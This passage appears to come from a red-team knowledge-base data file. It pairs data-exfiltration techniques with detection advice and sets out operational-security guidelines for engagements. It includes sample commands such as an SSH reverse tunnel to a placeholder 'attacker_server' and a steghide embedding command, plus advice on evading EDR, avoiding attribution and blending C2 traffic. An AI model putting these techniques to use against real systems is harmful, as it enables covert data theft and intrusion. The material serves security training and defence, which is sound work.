    detection: 'Implement USB device whitelisting via Group Policy or endpoint management. Monitor for USB device connections (Windows Event ID 6416). Deploy DLP agents that scan files written to removable media. Disable USB mass storage in high-security environments.',
    bandwidth: 'High - USB 3.0+ supports several GB/s transfer rates',
    stealthRating: 'Medium'
  },
  {
    name: 'Steganography',
    mitreTechnique: 'T1027.003',
    description: 'Steganography hides data within ordinary-looking files such as images, audio files, or video files. The hidden data is embedded in ways that do not perceptibly alter the carrier file, such as modifying the least significant bits of image pixels. Steganographic exfiltration is extremely difficult to detect because the carrier files appear legitimate when inspected visually or by standard tools.',
    tools: [
      'Steghide: steghide embed -cf cover.jpg -ef secret.zip -p password',
      'OpenStego for image-based steganography',
      'Invoke-PSImage for embedding PowerShell in PNG files',
      'Snow for whitespace steganography in text files',
      'Custom LSB embedding scripts for images'
    ],
    detection: 'Deploy statistical steganalysis tools to detect hidden data in files. Monitor for unusual volumes of image or media file uploads. Chi-square analysis can detect LSB steganography in images. Compare file sizes against expected dimensions for media files.',
    bandwidth: 'Low - carrier file capacity limits data throughput, typically KB to low MB per file',
    stealthRating: 'Very High'
  },
  {
    name: 'Exfiltration Over Encrypted Channel',
    mitreTechnique: 'T1573',
    description: 'Attackers establish encrypted tunnels using custom encryption or standard protocols (SSH, VPN, TLS) to exfiltrate data while preventing content inspection. Even organizations with TLS inspection capabilities may not decrypt all traffic types. Tunnels can be nested (SSH within HTTPS) to provide multiple layers of encryption.',
    tools: [
      'SSH tunnel: ssh -L 8080:internal:80 user@external (local forward)',
      'SSH reverse tunnel: ssh -R 9090:localhost:22 user@attacker_server',
      'Chisel for HTTP-based tunneling: chisel server -p 8080 --reverse',
      'Stunnel for TLS wrapping of arbitrary protocols',
      'WireGuard for VPN-based tunneling'
    ],
    detection: 'Monitor for long-duration encrypted connections to unusual destinations. Alert on SSH connections to non-corporate destinations. Inspect certificate details for self-signed or suspicious certificates. Detect tunneled protocols within encrypted channels using traffic analysis.',
    bandwidth: 'High - encrypted channels support full network bandwidth',
    stealthRating: 'High'
  },
  {
    name: 'Protocol Tunneling',
    mitreTechnique: 'T1572',
    description: 'Protocol tunneling encapsulates data within allowed protocols to bypass firewall rules and content inspection. Common techniques include HTTP tunnel proxies, WebSocket tunnels, and encapsulating arbitrary traffic within protocols that are allowed through the firewall. This allows attackers to bypass outbound firewall restrictions while maintaining a reliable data channel.',
    tools: [
      'Chisel for HTTP/WebSocket tunneling',
      'reGeorg/Neo-reGeorg for web shell-based SOCKS proxy',
      'Ligolo-ng for tunneling via TLS reverse connections',
      'Proxychains for routing traffic through SOCKS proxies',
      'ABPTTS for TCP tunneling over HTTP/HTTPS'
    ],
    detection: 'Monitor for long-duration HTTP connections with continuous data transfer. Detect WebSocket upgrades to unexpected endpoints. Analyze HTTP traffic patterns for tunnel characteristics (symmetric traffic, non-standard content types). Alert on CONNECT method usage to non-standard ports.',
    bandwidth: 'Medium to High - depends on the tunneling protocol overhead and network conditions',
    stealthRating: 'Medium'
  },
  {
    name: 'Scheduled Transfer',
    mitreTechnique: 'T1029',
    description: 'Rather than exfiltrating all data at once, attackers schedule small transfers at regular intervals to blend with normal network patterns and avoid triggering volume-based alerts. Data is staged locally, split into small chunks, and transmitted over time using any available channel. This approach mimics normal application behavior and is much harder to detect through traffic analysis.',
    tools: [
      'Scheduled tasks or cron jobs for timed transfers',
      'Custom scripts with sleep intervals between transfers',
      'C2 framework sleep and jitter settings',
      'PowerShell with Start-Sleep for paced exfiltration'
    ],
    detection: 'Baseline normal data transfer patterns and alert on sustained low-volume transfers to unusual destinations. Monitor for periodic connections at regular intervals (beaconing detection). Track cumulative data transfer volumes over time, not just per-session. Use statistical analysis to identify periodic communication patterns.',
    bandwidth: 'Low to Medium - intentionally limited to avoid detection',
    stealthRating: 'High'
  }
];

const OPSEC_GUIDELINES = [
  {
    guideline: 'Infrastructure Separation',
    description: 'Maintain strict separation between different categories of infrastructure used during engagements. Short-term attack infrastructure should be isolated from long-term persistent infrastructure, and neither should be traceable to the red team organization or its personnel.',
    rationale: 'If one piece of infrastructure is discovered and investigated, compartmentalization prevents the blue team from identifying and shutting down the entire red team operation. Separation also prevents forensic artifacts on one server from revealing other servers.',
    implementationSteps: [
      'Use separate VPS providers for different infrastructure categories (C2, phishing, redirectors)',
      'Register domains through different registrars using operational personas',
      'Use separate payment methods (cryptocurrency, prepaid cards) for each infrastructure set',
      'Never access attack infrastructure from personal or corporate IP addresses',
      'Use unique SSH keys for each infrastructure component',
      'Implement automated teardown procedures for burned infrastructure'
    ]
  },
  {
    guideline: 'Domain Categorization and Aging',
    description: 'Register domains well in advance of engagements and build their reputation through legitimate content, categorization submissions, and aging. Freshly registered domains are flagged by many security products and web proxies, reducing the effectiveness of phishing and C2 communications.',
    rationale: 'Domain age and categorization directly affect whether security tools allow or block traffic. New domains receive low trust scores and may be blocked by web proxies, DNS security tools, and email gateways. Properly aged and categorized domains bypass these controls.',
    implementationSteps: [
      'Register domains at least 30-60 days before the engagement',
      'Host legitimate-looking content on the domain during the aging period',
      'Submit domains for categorization to major web filtering vendors (Bluecoat, Palo Alto, etc.)',
      'Obtain SSL/TLS certificates from trusted CAs (Let\'s Encrypt or commercial)',
      'Build domain reputation by sending legitimate emails and building backlinks',
      'Choose domain names that resemble the target industry or common SaaS services'
    ]
  },
  {
    guideline: 'Malleable C2 Profiles',
    description: 'Customize command-and-control traffic to mimic legitimate application traffic patterns. Default C2 profiles are well-known to security analysts and will be quickly identified. Malleable profiles should match the target organization traffic patterns including user agents, HTTP headers, URI paths, and timing.',
    rationale: 'Network security monitoring tools and SOC analysts look for known C2 patterns in network traffic. Custom profiles that mimic legitimate SaaS applications (Slack, Teams, Google services) are far less likely to trigger alerts during manual traffic review.',
    implementationSteps: [
      'Research the target organization web traffic patterns before creating profiles',
      'Mimic legitimate SaaS application API calls and response formats',
      'Use appropriate HTTP headers including realistic User-Agent strings',
      'Configure realistic data transforms (base64, NetBIOS encoding, custom encoding)',
      'Test profiles against common detection tools before deployment',
      'Update JARM fingerprints by configuring TLS parameters to match common web servers',
      'Validate profiles with tools like c2lint before deployment'
    ]
  },
  {
    guideline: 'Redirector Architecture',
    description: 'Place redirector servers between target networks and C2 servers. Redirectors forward legitimate C2 traffic while blocking or redirecting investigation attempts by blue team analysts. This protects the C2 server IP address from discovery and allows rapid replacement of burned infrastructure.',
    rationale: 'Direct connections between targets and C2 servers expose the C2 infrastructure to discovery. Redirectors add a layer of indirection that protects backend infrastructure and allows the red team to continue operations even when individual redirectors are identified.',
    implementationSteps: [
      'Deploy Apache mod_rewrite or Nginx with conditional forwarding rules',
      'Configure redirectors to forward only traffic matching expected C2 patterns',
      'Redirect non-matching traffic to legitimate websites (categorization maintenance)',
      'Use cloud provider functions (AWS Lambda, Azure Functions, Cloudflare Workers) as serverless redirectors',
      'Implement domain fronting or CDN-based redirecting where appropriate',
      'Deploy multiple redirectors for redundancy and load distribution',
      'Automate redirector deployment with infrastructure-as-code tools (Terraform)'
    ]
  },
  {
    guideline: 'Burn Infrastructure Procedures',
    description: 'Establish clear procedures for identifying when infrastructure is compromised and rapidly decommissioning it. Pre-stage replacement infrastructure so operations can continue with minimal disruption when a component is discovered.',
    rationale: 'Operating on compromised infrastructure exposes additional techniques and tools to the defending team. Quick infrastructure rotation limits the defenders ability to analyze and respond to the red team activity.',
    implementationSteps: [
      'Define indicators that infrastructure has been discovered (IP blocks, domain takedowns, increased scanning)',
      'Pre-provision backup C2 servers and redirectors in different IP ranges',
      'Automate infrastructure teardown scripts that securely wipe all data',
      'Have pre-configured backup C2 profiles and domains ready for activation',
      'Document infrastructure rotation procedures for all team members',
      'Test backup infrastructure activation procedures before they are needed'
    ]
  },
  {
    guideline: 'Attribution Avoidance',
    description: 'Minimize technical artifacts that could link red team infrastructure or tools back to the team organization, its personnel, or previous engagements. This includes metadata in documents, timestamps, compiler artifacts, and network traffic patterns.',
    rationale: 'During purple team exercises, avoiding attribution tests the blue team forensic capabilities. For red team operations, proper attribution avoidance prevents premature discovery through infrastructure correlation across engagements.',
    implementationSteps: [
      'Remove metadata from all generated documents and payloads (exiftool -all= file)',
      'Use VMs in different time zones to avoid timezone-based attribution',
      'Compile payloads on clean systems with no identifying information',
      'Strip debug symbols and compilation artifacts from binaries',
      'Use unique tooling configurations for each engagement',
      'Avoid reusing domains, IP addresses, or C2 profiles across engagements'
    ]
  },
  {
    guideline: 'Log Management and Operational Logs',
    description: 'Maintain detailed operational logs of all red team activities while protecting these logs from discovery. Operational logs are essential for reporting and deconfliction but must be securely stored to prevent blue team access that could reveal upcoming attack phases.',
    rationale: 'Comprehensive logs are required for accurate reporting and to answer deconfliction questions from the SOC. However, if these logs are stored on compromised systems or accessible infrastructure, they could reveal the full scope of the operation prematurely.',
    implementationSteps: [
      'Log all commands executed on target systems with timestamps',
      'Store operational logs on secure, separate infrastructure (not on C2 servers)',
      'Encrypt operational logs at rest and in transit',
      'Use the C2 frameworks built-in logging capabilities (Cobalt Strike team server logs, Mythic database)',
      'Maintain a timeline of all activities for the final report',
      'Never store operational logs on target systems or compromised hosts'
    ]
  },
  {
    guideline: 'Communication Security',
    description: 'All team communications about the engagement must use encrypted channels separate from the target organization infrastructure. Never discuss engagement details, credentials, or findings over unencrypted channels or channels accessible to the target organization.',
    rationale: 'If red team communications are intercepted by the blue team, it reveals the full scope of the engagement, upcoming attack plans, and compromised credentials. This negates the value of the assessment and can create security incidents.',
    implementationSteps: [
      'Use end-to-end encrypted messaging (Signal, Wire) for team communications',
      'Never use the target organization email or messaging systems for team coordination',
      'Use a dedicated, encrypted team collaboration platform',
      'Implement PGP/GPG for encrypting sensitive files shared between team members',
      'Use separate devices for target interaction and team communication where possible',
      'Establish code words for sensitive concepts in case of communication interception'
    ]
  },
  {
    guideline: 'Payload Hygiene',
    description: 'Ensure all payloads are unique, tested, and free of identifying information before deployment. Test payloads against current security controls in a lab environment and verify they are not detected by cloud-based analysis services that share samples with security vendors.',
    rationale: 'Uploading payloads to public analysis services (VirusTotal) distributes them to all security vendors, resulting in rapid signature development. Payloads with identifying information can be attributed to the red team. Untested payloads risk detection and operational failure.',
    implementationSteps: [
      'Never upload payloads to VirusTotal or other public analysis services',
      'Use private scanning solutions (AntiScan.me was an option, but prefer local testing)',
      'Test payloads against the same AV/EDR products deployed at the target',
      'Generate unique payloads for each engagement and each target',
      'Remove all metadata, debug information, and compilation artifacts',
      'Use crypters and packers judiciously, as they can add detection surface',
      'Implement payload self-deletion after execution where appropriate'
    ]
  },
  {
    guideline: 'Network Traffic Blending',
    description: 'Ensure all red team network traffic blends with the normal traffic patterns of the target environment. This includes matching traffic volumes, timing, protocols, and destinations that are consistent with legitimate business operations.',
    rationale: 'Anomalous network traffic triggers alerts in SIEM systems, NDR solutions, and during manual traffic review. Traffic that matches the targets normal baseline is far less likely to be investigated by SOC analysts.',
    implementationSteps: [
      'Research the target typical network traffic patterns during reconnaissance',
      'Match C2 beacon intervals to normal application polling frequencies',
      'Use protocols and ports that are commonly seen in the target environment',
      'Configure appropriate jitter (15-25%) on beacon intervals to avoid periodicity detection',
      'Perform data exfiltration during business hours when traffic volume is higher',
      'Avoid large data transfers during off-hours when anomalies are more visible',
      'Use HTTPS to common cloud services rather than direct IP connections'
    ]
  },
  {
    guideline: 'Credential Handling',
    description: 'Securely manage all credentials obtained during the engagement. Harvested credentials should be stored encrypted, access-controlled, and never transmitted over insecure channels. Credential use should be minimized and tracked to support accurate reporting.',
    rationale: 'Compromised credentials are high-value targets for both the red team and any real attackers. Insecure storage or transmission of harvested credentials could result in actual unauthorized access if the engagement data is compromised.',
    implementationSteps: [
      'Store all harvested credentials in an encrypted credential vault (KeePass, 1Password)',
      'Never store plaintext credentials in operational logs or notes',
      'Track which credentials were used on which systems for reporting',
      'Delete harvested credentials from target systems after capture',
      'Report all compromised credentials to the client immediately if engagement rules require it',
      'Securely delete all credential material after the engagement concludes'
    ]
  },
  {
    guideline: 'User Agent and Browser Fingerprint Management',
    description: 'Standardize and control the user agent strings and browser fingerprints used during web-based reconnaissance and social engineering. Inconsistent or unusual fingerprints can reveal the use of automated tools or non-standard browsing environments.',
    rationale: 'Web application firewalls and fraud detection systems analyze user agent strings and browser fingerprints to identify automated tools and suspicious access patterns. Consistent, realistic fingerprints avoid triggering these controls.',
    implementationSteps: [
      'Use current, realistic user agent strings that match common browsers in the target environment',
      'Configure all tools and scripts with consistent user agent strings',
      'Use browser automation frameworks (Playwright, Puppeteer) with stealth plugins for web interaction',
      'Avoid using default tool user agents (Python-requests, curl default UA)',
      'Match the user agent to the operating system being used for the operation',
      'Rotate user agents periodically to avoid tracking based on static values'
    ]
  },
  {
    guideline: 'Time-Based Operations',
    description: 'Conduct operations during time windows that align with the target organizations business hours and typical administrative activity. Off-hours activity on corporate networks is more likely to trigger alerts and investigation by SOC analysts who have fewer events to monitor.',
    rationale: 'Security operations centers are more likely to investigate anomalous activity during off-hours because the reduced baseline of legitimate activity makes anomalies more visible. Operating during peak hours provides natural cover.',
    implementationSteps: [
      'Identify the target organization business hours and time zones',
      'Schedule active operations (lateral movement, credential access) during business hours',
      'Configure C2 beacons to reduce frequency or sleep during off-hours',
      'Avoid running scans or noisy tools outside of business hours',
      'Account for time zone differences when operating across geographic regions',
      'Be aware of holidays and reduced-staffing periods that may change detection risk'
    ]
  },
  {
    guideline: 'Cleanup and Artifact Removal',
    description: 'Remove all red team artifacts from target systems at the conclusion of the engagement. This includes payloads, persistence mechanisms, tools, logs, and any configuration changes made during the operation. Document all artifacts for the final report before removal.',
    rationale: 'Red team artifacts left on target systems represent real security risks if discovered and exploited by actual threat actors. Proper cleanup demonstrates professionalism and prevents the red team tools from being weaponized against the client.',
    implementationSteps: [
      'Maintain a real-time inventory of all artifacts deployed on target systems',
      'Remove all persistence mechanisms (registry keys, scheduled tasks, services, cron jobs)',
      'Delete all uploaded tools, payloads, and staging files',
      'Revert any configuration changes (firewall rules, user accounts, group memberships)',
      'Verify artifact removal through the C2 framework or manual checks',
      'Provide the client with a complete list of all artifacts that were deployed for independent verification'
    ]
  },
  {
    guideline: 'Deconfliction Procedures',
    description: 'Establish clear deconfliction procedures with the client to distinguish red team activity from real attacks. The red team must be able to quickly confirm or deny whether specific alerts or incidents are related to the engagement to prevent the SOC from chasing false leads during an actual attack.',
    rationale: 'Without deconfliction, the SOC may waste resources investigating red team activity while a real attacker operates undetected. Conversely, the SOC might dismiss real attacks as red team activity. Clear deconfliction procedures protect both the engagement and the organization.',
    implementationSteps: [
      'Establish a 24/7 emergency contact channel between the red team lead and the engagement sponsor',
      'Define a deconfliction process: SOC contacts sponsor, sponsor contacts red team lead',
      'Provide the sponsor with high-level timestamps of planned active operations',
      'Never provide detailed TTPs or IoCs to the SOC during the engagement (unless required by rules of engagement)',
      'Respond to deconfliction requests within a defined SLA (typically 30-60 minutes)',
      'Document all deconfliction requests and responses for the final report'
    ]
  }
];
